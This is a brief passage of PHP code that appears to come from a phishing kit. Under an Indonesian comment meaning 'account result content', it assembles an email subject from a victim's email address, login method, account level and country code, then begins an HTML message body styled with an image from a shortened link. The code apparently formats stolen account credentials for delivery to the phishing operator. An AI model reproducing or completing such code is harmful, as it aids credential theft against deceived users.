...
// KONTEN RESULT AKUN
$subjek = "$arpantek_flag | $codeflag | $arpantek_callingcode | $email | $level | $login";
$pesan = '
<center> 
<div style="background: url(https://bit.ly/3zNff5U) no-repeat center center; background-size: 100% 100%; width: 294; height: 100px; color: #000; text-align: center; border-top-left-radius: 5px; border-top-right-radius: 5px;"></div>
